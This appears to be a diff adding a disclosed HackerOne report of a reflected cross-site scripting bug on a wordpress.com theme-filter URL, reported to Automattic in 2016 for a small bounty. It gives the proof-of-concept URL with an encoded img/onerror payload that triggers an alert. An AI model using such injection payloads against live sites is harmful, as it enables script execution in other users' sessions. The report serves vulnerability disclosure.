@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/111500
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/valievkarim
+ReportedTo:Automattic(automattic)
+BountyAmount:75.0
+Severity:
+State:Closed
+DateOfDisclosure:18.02.2016 4:45:29
+
+Summary:
+
+1) Using Firefox, visit the link: https://wordpress.com/themes/filter/blog/type/%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E
+2) alert is shown.
+
+Screenshot is attached
